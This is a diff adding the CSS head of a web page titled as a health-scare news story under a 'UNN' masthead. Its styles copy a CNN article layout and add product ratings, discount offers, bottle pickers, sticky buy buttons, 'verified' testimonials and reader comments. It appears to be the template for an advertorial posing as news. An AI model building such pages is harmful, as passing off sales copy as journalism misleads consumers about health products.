@@ -1,0 +1,919 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Georgia mom nearly dies on flight to daughter's wedding | UNN</title>   <style>:root {
+    --cnn-red: #cc0000;
+    --cnn-red-dark: #a30000;
+    --ink: #0c0c0c;
+    --ink-soft: #262626;
+    --ink-mid: #404040;
+    --ink-faint: #6e6e6e;
+    --ink-fainter: #a0a0a0;
+    --hair: #d9d9d9;
+    --hair-soft: #ececec;
+    --bg: #ffffff;
+    --sans: "Inter", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+    --serif-tight: "Inter Tight", "Inter", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  }
+
+  * { box-sizing: border-box; }
+  body { margin: 0; }
+
+  .page {
+    background: var(--bg);
+    color: var(--ink);
+    font-family: var(--sans);
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.5;
+  }
+  a { color: inherit; text-decoration: none; }
+
+  /* Sticky full-width header (whole bar sticks on desktop + mobile) */
+  .site-header { position: static; z-index: 30; width: 100%; background: var(--bg); box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+
+  /* ---------- CNN header ---------- */
+  .utility {
+    border-bottom: 1px solid var(--hair-soft);
+    height: 38px;
+    display: flex; align-items: center; justify-content: flex-end;
+    gap: 22px; padding: 0 20px;
+    font-size: 11px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: .05em; color: var(--ink-mid);
+  }
+  .utility .u-sep { width: 1px; height: 14px; background: var(--hair); }
+
+  .masthead {
+    display: none; align-items: center; gap: 18px;
+    padding: 12px 24px; max-width: 1280px; margin: 0 auto; width: 100%;
+  }
+  .menu-btn { display: flex; flex-direction: column; gap: 4px; padding: 6px; margin: -6px; cursor: pointer; background: none; border: 0; }
+  .menu-btn span { width: 20px; height: 2px; background: var(--ink); display: block; transition: transform .25s ease, opacity .2s ease; }
+  .menu-btn.open span:nth-child(1) { transform: translateY(6px) rotate(45deg); }
+  .menu-btn.open span:nth-child(2) { opacity: 0; }
+  .menu-btn.open span:nth-child(3) { transform: translateY(-6px) rotate(-45deg); }
+
+  .logo svg { display: block; }
+  .logo-text { font-weight: 900; font-size: 26px; letter-spacing: -.07em; color: var(--cnn-red); line-height: 1; white-space: nowrap; -webkit-text-stroke: .6px var(--cnn-red); }
+  .nav-brand .logo-text { font-size: 24px; -webkit-text-stroke-width: .5px; }
+  .drawer-head .logo-text { font-size: 28px; }
+  .footer-logo .logo-text { color: #fff; font-size: 30px; -webkit-text-stroke-color: #fff; }
+  .logo-img { height: 22px; width: auto; display: block; }
+  .page .site-header .nav-brand .logo-img { height: 22px !important; width: auto !important; max-width: none !important; }
+  .search-pill { margin-left: auto; display: flex; align-items: center; gap: 8px; border: 1px solid var(--hair); border-radius: 999px; padding: 7px 14px; color: var(--ink-faint); font-size: 13px; min-width: 170px; }
+  .watch-live { display: inline-flex; align-items: center; gap: 8px; background: var(--cnn-red); color: #fff; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .04em; padding: 8px 14px; border-radius: 3px; white-space: nowrap; }
+  .watch-live .dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; }
+
+  .section-nav { border-top: 1px solid var(--hair-soft); border-bottom: 1px solid var(--hair-soft); position: relative; z-index: 1; background: var(--bg); display: flex; align-items: center; width: 100%; }
+  .scroll-progress { position: absolute; left: 0; bottom: -1px; height: 3px; width: 100%; background: var(--cnn-red); transform: scaleX(0); transform-origin: left center; will-change: transform; z-index: 1; }
+  .nav-brand { display: none; align-items: center; gap: 12px; flex: none; padding-left: 16px; }
+  .nav-brand .menu-btn { display: flex; }
+  .nav-brand .logo svg { display: block; }
+  .section-nav ul { list-style: none; margin: 0 auto; padding: 0 24px; max-width: 1280px; width: 100%; display: flex; gap: 22px; overflow-x: auto; height: 44px; align-items: center; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: .03em; color: var(--ink-mid); scrollbar-width: none; -webkit-overflow-scrolling: touch; }
+  .section-nav ul::-webkit-scrollbar { display: none; }
+  .section-nav li { white-space: nowrap; padding: 3px 0; border-bottom: 3px solid transparent; }
+  .section-nav li.active { color: var(--ink); border-bottom-color: var(--cnn-red); }
+
+  /* Mobile menu */
+  .mobile-menu { position: fixed; inset: 0; z-index: 40; visibility: hidden; }
+  .mobile-menu.open { visibility: visible; }
+  .mobile-menu .scrim { position: absolute; inset: 0; background: rgba(0,0,0,.45); opacity: 0; transition: opacity .25s ease; }
+  .mobile-menu.open .scrim { opacity: 1; }
+  .mobile-menu .drawer { position: absolute; top: 0; left: 0; bottom: 0; width: 82%; max-width: 320px; background: var(--bg); transform: translateX(-100%); transition: transform .28s cubic-bezier(.4,0,.2,1); display: flex; flex-direction: column; box-shadow: 2px 0 24px rgba(0,0,0,.16); overflow-y: auto; }
+  .mobile-menu.open .drawer { transform: translateX(0); }
+  .drawer-head { display: flex; align-items: center; justify-content: space-between; padding: 16px 18px; border-bottom: 1px solid var(--hair-soft); }
+  .drawer-close { background: none; border: 0; font-size: 26px; line-height: 1; color: var(--ink); cursor: pointer; padding: 4px 8px; }
+  .drawer ul { list-style: none; margin: 8px 0; padding: 0; }
+  .drawer li { padding: 13px 18px; font-size: 15px; font-weight: 700; text-transform: uppercase; letter-spacing: .03em; color: var(--ink); border-bottom: 1px solid var(--hair-soft); }
+  .drawer li.active { color: var(--cnn-red); }
+
+  .disclosure { background: #fafafa; border-bottom: 1px solid var(--hair-soft); text-align: center; font-size: 11px; letter-spacing: .06em; text-transform: uppercase; color: var(--ink-faint); padding: 9px 20px; font-weight: 700; }
+  .disclosure span { color: var(--ink-mid); }
+
+  /* ---------- Article grid: left share rail + centered column ---------- */
+  .l-grid { max-width: 730px; margin: 0 auto; padding: 22px 20px 60px; }
+  .article-col { min-width: 0; }
+
+  .breadcrumb { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .06em; color: var(--ink); margin-bottom: 14px; }
+  .rt-dot { color: #B1B1B1; font-weight: 700; }
+  .read-time { color: #6E6E6E; font-weight: 500; }
+  .breaking { display: inline-flex; align-items: center; gap: 6px; background: var(--cnn-red); color: #fff; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: .07em; padding: 4px 9px; border-radius: 3px; margin-bottom: 12px; }
+  .breaking-dot { width: 6px; height: 6px; border-radius: 50%; background: #fff; animation: breaking-pulse 1.4s ease-in-out infinite; }
+  @keyframes breaking-pulse { 0%, 100% { opacity: 1; } 50% { opacity: .25; } }
+  @media (prefers-reduced-motion: reduce) { .breaking-dot { animation: none; } }
+  .kicker { font-size: 15px; font-weight: 600; color: var(--ink-faint); margin: 0 0 10px; }
+  .headline { font-family: var(--serif-tight); font-size: clamp(30px, 4.4vw, 42px); line-height: 1.12; font-weight: 800; letter-spacing: -0.022em; margin: 0 0 18px; color: var(--ink); }
+
+  .byline { display: flex; align-items: center; gap: 12px; margin: 0 0 6px; }
+  .byline .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex: none; display: block; border: 1px solid var(--hair-soft); }
+  .byline .who { font-size: 14px; color: var(--ink-soft); line-height: 1.25; }
+  .byline .who a, .byline .who strong { font-weight: 700; color: var(--ink); }
+  .byline .stamp { font-size: 13px; color: var(--ink-faint); margin-top: 0; line-height: 1.25; }
+
+  .share-inline { display: flex; justify-content: flex-end; gap: 8px; margin: -18px 0 8px; }
+  .share-inline a { width: 34px; height: 34px; border-radius: 7px; border: 1px solid var(--hair); display: flex; align-items: center; justify-content: center; color: var(--ink-mid); transition: background .15s ease, color .15s ease; }
+  .share-inline a:hover { background: #f2f2f2; color: var(--ink); }
+
+  .rule { border: 0; border-top: 1px solid var(--hair); margin: 18px 0 26px; }
+
+  /* Figures — CNN caption + credit */
+  figure.fig { margin: 26px 0; }
+  figure.fig img { width: 100%; height: auto; display: block; }
+  figure.fig.narrow { max-width: 500px; margin-left: auto; margin-right: auto; }
+  figcaption { font-size: 13px; color: var(--ink-faint); line-height: 1.45; padding-top: 8px; }
+  figcaption .credit { color: var(--ink-fainter); }
+
+  /* GIF / image placeholders (for designer) */
+  .gif-ph, .img-ph { position: relative; display: flex; align-items: center; justify-content: center; text-align: center; width: 100%; aspect-ratio: 16 / 9; background: #f0f0ec; border: 2px dashed #c4c4bb; border-radius: 4px; color: #8a8a7a; font-size: 14px; font-style: italic; letter-spacing: .01em; padding: 20px; }
+  .gif-ph-tag, .img-ph-tag { position: absolute; top: 10px; left: 10px; background: #8a8a7a; color: #fff; font-style: normal; font-weight: 800; font-size: 10px; letter-spacing: .08em; text-transform: uppercase; padding: 3px 7px; border-radius: 3px; }
+
+  /* Looping video that behaves like a GIF (no controls, no interaction) */
+  .gif-video { display: block; width: 100%; height: auto; pointer-events: none; background: #f0f0ec; }
+
+  /* Figure with a red attention bar on the left (matches callouts) */
+  figure.fig.quote-img { padding: 0; font-size: 0; line-height: 0; }
+  figure.fig.quote-img img { display: block; border-left: 4px solid var(--cnn-red); }
+
+  /* Body */
+  .body { font-size: 18px; line-height: 1.62; color: var(--ink-soft); }
+  .body p { margin: 0 0 22px; }
+  .body strong { font-weight: 700; color: var(--ink); }
+  .body em { font-style: italic; }
+
+  /* Red-bullet list */
+  .red-list { list-style: none; margin: 20px 0 22px; padding: 0; }
+  .red-list li { position: relative; margin: 0 0 12px; padding-left: 24px; font-size: inherit; line-height: 1.6; color: var(--ink-soft); }
+  .red-list li:last-child { margin-bottom: 0; }
+  .red-list li::before { content: ""; position: absolute; left: 3px; top: 11px; width: 7px; height: 7px; border-radius: 50%; background: var(--cnn-red); }
+
+  /* Numbered factor list (why-veins-leak) */
+  .factor-list { margin: 20px 0 26px; }
+  .factor { display: flex; gap: 16px; align-items: baseline; padding: 20px 0; border-top: 1px solid var(--rule, #e6e4df); }
+  .factor:first-child { border-top: none; padding-top: 4px; }
+  .factor .num { flex-shrink: 0; min-width: 24px; color: var(--cnn-red); font-size: 20px; font-weight: 900; }
+  .factor .txt { flex: 1; min-width: 0; }
+  .factor h3 { font-size: 18px; line-height: 1.25; font-weight: 800; color: var(--ink); margin: 0 0 6px; letter-spacing: -.01em; }
+  .factor p { font-size: inherit; line-height: 1.6; color: var(--body, var(--ink-soft)); margin: 0; }
+
+  h2.sec { font-family: var(--serif-tight); font-size: clamp(22px, 2.8vw, 27px); font-weight: 700; letter-spacing: -0.01em; line-height: 1.22; margin: 40px 0 4px; color: var(--ink); }
+  h2.sec + p { margin-top: 12px; }
+  .lead-in { font-weight: 700; color: var(--ink); }
+
+  /* Callout box with left red bar */
+  .callout { border-left: 4px solid var(--cnn-red); background: #f7f7f6; padding: 18px 22px; margin: 22px 0; border-radius: 0 4px 4px 0; }
+  .callout .callout-title { display: block; font-weight: 800; font-size: 18px; color: var(--ink); margin-bottom: 6px; }
+  .callout p { margin: 0; }
+  .callout .gif-ph { margin-top: 14px; }
+  .callout .gif-video { margin-top: 14px; }
+
+  /* Amazon-style rating (left, just above the product image) */
+  .amz-rating { display: flex; align-items: center; gap: 7px; margin: 0 0 14px; }
+  .amz-score { font-size: 14px; font-weight: 700; color: #0f1111; }
+  .amz-stars { position: relative; display: inline-block; font-size: 16px; line-height: 1; }
+  .amz-stars-empty { color: #d5d9d9; letter-spacing: 1px; }
+  .amz-stars-full { position: absolute; top: 0; left: 0; overflow: hidden; white-space: nowrap; color: #ffa41c; letter-spacing: 1px; }
+  .amz-count { font-size: 14px; color: var(--ink); }
+
+  /* Pull quote with source logo */
+  .pullquote { display: flex; align-items: center; gap: 20px; margin: 30px 0; padding: 20px 24px; background: #f6f7f8; border-left: 4px solid var(--cnn-red); }
+  .pullquote .pq-logo { flex: 0 0 auto; width: 88px; display: flex; align-items: center; justify-content: center; }
+  .pullquote .pq-logo img { max-width: 88px; max-height: 66px; width: 100%; height: auto; object-fit: contain; display: block; }
+  .pullquote .pq-body { flex: 1; min-width: 0; }
+  .pullquote blockquote { margin: 0; font-size: 20px; line-height: 1.45; font-weight: 400; color: #1a1a1a; }
+  .pullquote cite { display: block; font-style: normal; font-size: 12px; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; color: var(--ink-faint); margin-top: 8px; }
+  @media (max-width: 560px) {
+    .pullquote { gap: 14px; padding: 16px 16px; }
+    .pullquote .pq-logo { width: 60px; }
+    .pullquote .pq-logo img { max-width: 60px; max-height: 54px; }
+    .pullquote blockquote { font-size: 17px; }
+  }
+
+  /* Fact box */
+  .factbox { border: 1px solid var(--hair); border-top: 3px solid var(--ink); padding: 22px 24px; margin: 30px 0; background: #fbfbfa; }
+  .factbox .fb-label { font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: .08em; color: var(--cnn-red); margin: 0 0 14px; }
+  .factbox h4 { font-size: 13px; text-transform: uppercase; letter-spacing: .04em; color: var(--ink-faint); margin: 16px 0 8px; }
+  .factbox h4:first-of-type { margin-top: 0; }
+  .factbox ul { margin: 0; padding: 0 0 0 20px; }
+  .factbox li { font-size: 16px; line-height: 1.6; color: var(--ink-mid); margin-bottom: 4px; }
+  .factbox .fb-cols { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 32px; }
+  @media (max-width: 520px) { .factbox .fb-cols { grid-template-columns: 1fr; } }
+
+  .spec-img { width: 100%; display: block; margin: 0 0 18px; } /* used by reader-offer box */
+
+  /* At-a-glance spec card (Linfaflow-style, clean bordered table) */
+  .spec-card { position: relative; background: #fff; border: 1px solid var(--hair); border-top: none; border-radius: 0; padding: 32px 26px 28px; margin: 32px 0; box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+  .spec-card::before { content: ""; position: absolute; top: 0; left: -1px; right: -1px; height: 4px; background: var(--cnn-red); }
+  .spec-card-header { text-align: left; margin-bottom: 6px; }
+  .spec-card-eyebrow { display: flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: .1em; color: var(--cnn-red); margin: 0 0 8px; }
+  .eyebrow-mark { width: 10px; height: 10px; background: var(--cnn-red); display: inline-block; }
+  .spec-card-title { font-size: 28px; font-weight: 800; color: var(--ink); margin: 0 0 6px; line-height: 1.18; }
+  .spec-card-dek { font-size: 14px; line-height: 1.4; color: var(--ink-faint); font-weight: 500; margin: 0; }
+  .spec-card-img { width: 100%; max-width: none; height: auto; display: block; margin: 18px 0 24px; border-radius: 0; }
+  /* div/grid layout */
+  .spec-list { font-size: 15px; }
+  .spec-list .spec-row { display: grid; grid-template-columns: 32% 1fr; column-gap: 10px; padding: 18px 0; margin: 0; border: 0; border-top: 1px solid rgba(0,0,0,.08); align-items: start; background: none; }
+  .spec-list .spec-row:first-child { border-top: 0; }
+  .spec-list .spec-label { font-size: 12px; font-weight: 700; line-height: 1.8; color: var(--ink-faint); text-transform: uppercase; letter-spacing: .04em; }
+  .spec-list .spec-value { font-size: 15px; line-height: 1.55; color: var(--ink-soft); font-weight: 500; }
+  @media (max-width: 480px) {
+    .spec-card { padding: 28px 20px 24px; }
+    .spec-list .spec-row { grid-template-columns: 32% 1fr; column-gap: 10px; padding: 14px 0; }
+    .spec-list .spec-value { font-size: 14px; }
+  }
+
+  /* Glance box offer + CTA (reference box style) */
+  .glance-rule { height: 1px; background: var(--hair-soft); margin: 22px 0 18px; }
+  .glance-anniversary { text-align: center; font-size: 12.5px; line-height: 1.5; color: var(--ink-faint); text-transform: uppercase; letter-spacing: .03em; font-weight: 700; margin: 0 0 14px; padding: 0 4px; }
+  .glance-anniversary b { color: var(--ink); font-weight: 800; }
+  .glance-cta { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; background: var(--cnn-red); color: #fff; text-decoration: none; font-size: 17px; font-weight: 800; letter-spacing: .05em; text-transform: uppercase; padding: 18px 16px; border-radius: 0; transition: background .15s ease, transform .05s ease; }
+  .glance-cta .arw { display: inline-flex; align-items: center; transition: transform .18s ease; }
+  .glance-cta:link, .glance-cta:visited, .glance-cta:active, .glance-cta:focus { color: #fff; }
+  .glance-cta:hover { background: var(--cnn-red-dark); color: #fff; }
+  .glance-cta:hover .arw { transform: translateX(4px); }
+  .glance-cta:active { transform: translateY(1px); }
+  @media (prefers-reduced-motion: reduce) { .glance-cta, .glance-cta .arw { transition: none; } }
+  .cta-standalone { margin: 34px 0; }
+
+  /* Sticky bottom CTA — armed after the first inline CTA is seen, shown when no inline CTA is on screen */
+  .sticky-cta-bar { font-family: var(--sans); position: fixed; left: 0; right: 0; bottom: 0; z-index: 60;
+    padding: 10px 14px; padding-bottom: calc(10px + env(safe-area-inset-bottom));
+    background: rgba(255,255,255,.97); box-shadow: 0 -3px 18px rgba(0,0,0,.14);
+    transform: translateY(120%); transition: transform .3s cubic-bezier(.16,1,.3,1);
+    will-change: transform; }
+  .sticky-cta-bar.show { transform: translateY(0); }
+  .sticky-cta-bar .glance-cta { max-width: 640px; margin: 0 auto; }
+  @media (prefers-reduced-motion: reduce) { .sticky-cta-bar { transition: none; } }
+
+  /* Inline bottle-selector inside the At-a-Glance box (reuses the .qp* quiz styles,
+     so it must re-declare the custom props those styles read from .q-overlay). */
+  .glance-picker { --ink:#0A0A0A; --body:#2b2b2b; --label:#6b6b6b; --rule:#e0e0e0; --cnn-red:#CC0000; --cnn-red-dark:#A80000; }
+  .glance-picker .q-choose { margin-top: 2px; }
+  /* wider inline cards make the -8px badge read tighter to the name than in the narrow
+     popup — add a little top room so the OFF pill floats off the bottle amount */
+  .glance-picker .qp-grid { margin-top: 12px; }
+  .glance-picker .qp { padding-top: 16px; }
+
+  /* Timeline list */
+  .timeline { list-style: none; margin: 24px 0; padding: 0; }
+  .timeline li { padding: 18px 0; border-top: 1px solid var(--hair-soft); }
+  .timeline li:first-child { border-top: 0; }
+  .timeline .wk { font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: .06em; color: var(--cnn-red); }
+  .timeline .tt { font-weight: 700; font-size: 18px; color: var(--ink); margin: 3px 0 5px; }
+  .timeline p { margin: 0; font-size: 16px; line-height: 1.6; color: var(--ink-mid); }
+
+  /* Benefits */
+  .benefits { list-style: none; margin: 22px 0; padding: 0; }
+  .benefits li { padding: 14px 0; border-top: 1px solid var(--hair-soft); font-size: 16px; line-height: 1.6; color: var(--ink-mid); }
+  .benefits li:first-child { border-top: 0; }
+  .benefits li strong { display: block; font-size: 18px; color: var(--ink); margin-bottom: 3px; }
+  .benefits li strong::before { content: ""; display: inline-block; width: 10px; height: 10px; margin-right: 9px; background: var(--cnn-red); vertical-align: baseline; }
+
+  /* Reader offer */
+  .offer { border: 1px solid var(--hair); border-radius: 4px; padding: 24px; margin: 34px 0; }
+  .offer .fb-label { font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: .08em; color: var(--cnn-red); margin: 0 0 14px; text-align: center; }
+  .offer-row { display: flex; gap: 14px; justify-content: center; align-items: flex-end; margin: 0 0 18px; }
+  .offer-row a { text-align: center; flex: 1; max-width: 150px; }
+  .offer-row img { width: 100%; height: auto; display: block; }
+  .offer-opt { margin-top: 8px; font-size: 14px; line-height: 1.4; color: var(--ink-mid); }
+  .offer-opt b { display: block; color: var(--ink); font-size: 15px; }
+  .offer-opt .was { color: var(--ink-faint); text-decoration: line-through; margin-right: 5px; }
+  .cta-wrap { text-align: center; margin-top: 6px; }
+  .cta-btn { display: inline-flex; align-items: center; justify-content: center; background: var(--cnn-red); color: #fff; font-weight: 700; font-size: 15px; text-transform: uppercase; letter-spacing: .04em; padding: 14px 30px; border-radius: 3px; transition: background .2s ease; }
+  .cta-btn:hover { background: var(--cnn-red-dark); }
+  .offer-fine { text-align: center; font-size: 13px; color: var(--ink-faint); margin: 14px 0 0; }
+  @media (max-width: 480px) { .offer-row { flex-wrap: wrap; } }
+
+  /* Reader testimonials — editorial voices */
+  .voices { margin: 44px 0 0; }
+  .v-kicker { color: var(--cnn-red); font-size: 11px; font-weight: 800; letter-spacing: .13em; text-transform: uppercase; margin: 0 0 3px; }
+  .voices h2.sec { font-size: clamp(22px, 2.8vw, 27px); font-weight: 700; color: var(--ink); line-height: 1.22; letter-spacing: -0.01em; margin: 0 0 12px; }
+  .voices .v-intro { font-size: 18px; font-weight: 400; line-height: 1.62; color: var(--ink-soft); margin: 0 0 22px; }
+  .tcard { position: relative; margin: 0 0 14px; background: #f7f7f6; padding: 18px 22px 16px; border-radius: 0 4px 4px 0; }
+  .tcard::before { content: ""; position: absolute; top: 0; bottom: 0; left: 0; width: 4px; background: var(--cnn-red); }
+  .tstars { color: #f5a623; font-size: 14px; letter-spacing: 1.5px; margin: 0 0 11px; }
+  .tstars .off { color: #d8d5cf; }
+  .tcard blockquote { margin: 0 0 14px; font-size: 16.5px; line-height: 1.62; color: var(--ink-soft); font-weight: 400; }
+  .tcard .t-photo { display: block; width: 100%; height: auto; border-radius: 0; margin: 0 0 14px; }
+  .tcard figcaption { display: flex; flex-direction: row; align-items: center; gap: 12px; }
+  .tcard .t-avatar { width: 46px; height: 46px; border-radius: 50%; object-fit: cover; flex: none; display: block; background: #e3e3e3; }
+  .tcard .t-meta { display: flex; flex-direction: column; gap: 1px; min-width: 0; }
+  .tname { font-size: 14px; font-weight: 800; color: #0A0A0A; line-height: 1.25; }
+  .tmeta { font-size: 13px; font-weight: 400; color: #6b6b6b; line-height: 1.25; }
+  .tverified { font-size: 12px; color: #1a7f47; font-weight: 700; margin-top: 4px; display: inline-flex; align-items: center; gap: 4px; }
+
+  /* Comments — CNN editorial style */
+  .comments { margin-top: 46px; padding-top: 26px; border-top: 3px solid var(--ink); }
+  .comments-head { display: flex; align-items: baseline; gap: 10px; margin-bottom: 22px; }
+  .comments-head h2 { font-size: 22px; font-weight: 800; color: var(--ink); margin: 0; letter-spacing: -0.01em; }
+  .comments-count { font-size: 14px; font-weight: 700; color: var(--ink-faint); }
+  .comment-composer { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
+  .composer-av { width: 40px; height: 40px; border-radius: 50%; background: #e3e3e3; flex: none; }
+  .comment-composer input { flex: 1; border: 1px solid var(--hair); border-radius: 999px; padding: 11px 18px; font-family: inherit; font-size: 14px; color: var(--ink); background: #fff; }
+  .comment-composer input:focus { outline: none; border-color: var(--ink-faint); }
+  .comment { display: flex; gap: 12px; padding: 16px 0; border-top: 1px solid var(--hair-soft); }
+  .comment.reply { margin-left: 52px; }
+  .comment-av { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex: none; display: block; }
+  .comment-main { flex: 1; min-width: 0; }
+  .comment-name { font-weight: 700; font-size: 14px; color: var(--ink); }
+  .comment-text { font-size: 15px; line-height: 1.55; color: var(--ink-soft); margin: 3px 0 8px; }
+  .comment-photo { display: block; max-width: 220px; width: 100%; border-radius: 10px; border: 1px solid var(--hair-soft); margin: 0 0 8px; }
+  .comment-meta { display: flex; align-items: center; gap: 14px; font-size: 12px; font-weight: 700; color: var(--ink-faint); }
+  .comment-meta .c-link:hover { color: var(--ink); }
+  .comment-meta .c-likes { display: inline-flex; align-items: center; gap: 4px; color: var(--ink-mid); }
+  .comment-meta .c-likes svg { color: var(--cnn-red); }
+  .comment-meta .c-time { font-weight: 400; color: var(--ink-fainter); }
+  @media (max-width: 480px) { .comment.reply { margin-left: 26px; } .comment-photo { max-width: 180px; } }
+
+  /* Footer */
+  .footer { background: #0d0d0d; color: #b8b8b8; padding: 46px 20px; margin-top: 34px; }
+  .footer-inner { max-width: 1120px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 22px; text-align: center; }
+  .footer-logo svg { width: 66px; height: auto; display: block; }
+  .footer-nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 22px; max-width: 720px; }
+  .footer-nav a { color: #e6e6e6; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .04em; }
+  .footer-nav a:hover { color: #fff; }
+  .footer-legal { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 16px; }
+  .footer-legal a { color: #9a9a9a; font-size: 12px; }
+  .footer-legal a:hover { color: #d5d5d5; text-decoration: underline; }
+  .footer-copyright { font-size: 12px; color: #7a7a7a; }
+  .footer-disclaimer { font-size: 11px; color: #6f6f6f; line-height: 1.6; max-width: 780px; margin: 4px auto 0; border-top: 1px solid #222; padding-top: 18px; }
+
+  /* ===== Layout hardening ===== */
+  /* Fonts: Inter everywhere, Inter Tight on the headline */
+  .page, .page * { font-family: var(--sans) !important; }
+  .page .headline, .page h2.sec { font-family: var(--serif-tight) !important; }
+  .page .logo-text { font-family: var(--serif-tight) !important; }
+  /* Sticky full-width header */
+  .page .site-header { position: static !important; top: auto !important; z-index: 30 !important; width: 100% !important; max-width: none !important; overflow: visible !important; display: flex !important; flex-direction: column !important; height: auto !important; min-height: 0 !important; padding: 0 !important; border: 0 !important; line-height: normal !important; font-size: 0 !important; }
+  .page .site-header .section-nav { flex: none !important; min-height: 0 !important; }
+  .page .site-header .section-nav { max-width: none !important; width: 100% !important; margin: 0 !important; }
+  .page .site-header .masthead, .page .site-header .section-nav ul { max-width: 1280px !important; margin-left: auto !important; margin-right: auto !important; width: 100% !important; }
+  /* Header interior — force MY layout/styling over the theme's header/nav/ul/li/svg CSS */
+  .page .site-header .masthead { display: none !important; }
+  .page .site-header .menu-btn { display: flex !important; flex-direction: column !important; align-items: stretch !important; justify-content: center !important; gap: 4px !important; width: auto !important; height: auto !important; min-height: 0 !important; padding: 6px !important; margin: -6px !important; background: none !important; border: 0 !important; box-shadow: none !important; border-radius: 0 !important; cursor: pointer !important; }
+  .page .site-header .menu-btn span { display: block !important; width: 20px !important; height: 2px !important; min-height: 0 !important; margin: 0 !important; padding: 0 !important; background: var(--ink) !important; border: 0 !important; border-radius: 0 !important; }
+  .page .site-header .logo { display: inline-flex !important; align-items: center !important; padding: 0 !important; margin: 0 !important; border: 0 !important; background: none !important; box-shadow: none !important; }
+  .page .site-header .logo svg { display: block !important; max-width: none !important; }
+  .page .site-header .masthead > .logo svg { width: 58px !important; height: 28px !important; }
+  .page .site-header .nav-brand .logo svg { width: 46px !important; height: 22px !important; }
+  .page .site-header a { color: inherit !important; text-decoration: none !important; box-shadow: none !important; }
+  .page .site-header .search-pill { display: flex !important; flex: none !important; align-items: center !important; gap: 8px !important; margin: 0 0 0 auto !important; min-width: 170px !important; padding: 7px 14px !important; border: 1px solid var(--hair) !important; border-radius: 999px !important; background: none !important; color: var(--ink-faint) !important; font-size: 13px !important; }
+  .page .site-header .search-pill svg { width: 15px !important; height: 15px !important; flex: none !important; }
+  .page .site-header .watch-live { display: inline-flex !important; align-items: center !important; gap: 8px !important; margin: 0 !important; padding: 8px 14px !important; background: var(--cnn-red) !important; color: #fff !important; border: 0 !important; border-radius: 3px !important; font-size: 12px !important; font-weight: 700 !important; text-transform: uppercase !important; letter-spacing: .04em !important; white-space: nowrap !important; }
+  .page .site-header .watch-live .dot { width: 8px !important; height: 8px !important; border-radius: 50% !important; background: #fff !important; }
+  .page .site-header .section-nav { display: flex !important; align-items: center !important; border-top: 1px solid var(--hair-soft) !important; border-bottom: 1px solid var(--hair-soft) !important; background: var(--bg) !important; }
+  .page .site-header .section-nav ul { display: flex !important; list-style: none !important; padding: 0 24px !important; gap: 22px !important; height: 44px !important; align-items: center !important; overflow-x: auto !important; }
+  .page .site-header .section-nav li { display: block !important; list-style: none !important; margin: 0 !important; padding: 3px 0 !important; border: 0 !important; border-bottom: 3px solid transparent !important; background: none !important; color: var(--ink-mid) !important; font-size: 13px !important; font-weight: 700 !important; line-height: 1.2 !important; text-transform: uppercase !important; letter-spacing: .03em !important; white-space: nowrap !important; }
+  .page .site-header .section-nav li::marker, .page .site-header .section-nav li::before { content: "" !important; display: none !important; }
+  .page .site-header .section-nav li.active { color: var(--ink) !important; border-bottom-color: var(--cnn-red) !important; }
+  .page .site-header .nav-brand { display: none !important; }
+  @media (max-width: 768px) {
+    .page .site-header .masthead { display: none !important; }
+    .page .site-header .nav-brand { display: flex !important; flex-direction: row !important; align-items: center !important; gap: 12px !important; padding-left: 16px !important; }
+    .page .site-header .section-nav { height: 52px !important; }
+    .page .site-header .section-nav ul { display: none !important; }
+  }
+  /* Testimonials: theme resets figure margins → cards glue together */
+  .voices .tcard { position: relative !important; display: block !important; float: none !important; width: auto !important; margin: 0 0 16px !important; border: 0 !important; }
+  .voices .tcard::before { top: 0 !important; bottom: 0 !important; left: 0 !important; width: 4px !important; background: var(--cnn-red) !important; }
+  .voices .tcard:last-child { margin-bottom: 0 !important; }
+  .voices .tcard blockquote { margin: 0 0 14px !important; padding: 0 !important; border: 0 !important; quotes: none !important; }
+  .voices .tcard .t-photo { display: block !important; float: none !important; width: 100% !important; max-width: 100% !important; height: auto !important; margin: 0 0 14px !important; border-radius: 0 !important; }
+  .voices .tcard figcaption { display: flex !important; flex-direction: row !important; align-items: center !important; gap: 12px !important; margin: 0 !important; }
+  .voices .tcard .t-avatar { flex: 0 0 46px !important; width: 46px !important; height: 46px !important; min-width: 46px !important; margin: 0 !important; border-radius: 50% !important; object-fit: cover !important; max-width: none !important; }
+  .voices .tcard .t-meta { display: flex !important; flex-direction: column !important; gap: 1px !important; min-width: 0 !important; }
+
+  /* Standalone testimonial cards (outside .voices — e.g. after the trial timeline) */
+  .article-col .tcard { position: relative !important; display: block !important; float: none !important; width: auto !important; margin: 0 0 14px !important; padding: 18px 22px 16px !important; background: #f7f7f6 !important; border: 0 !important; border-radius: 0 4px 4px 0 !important; }
+  .article-col .tcard::before { content: "" !important; position: absolute !important; top: 0 !important; bottom: 0 !important; left: 0 !important; width: 4px !important; background: var(--cnn-red) !important; }
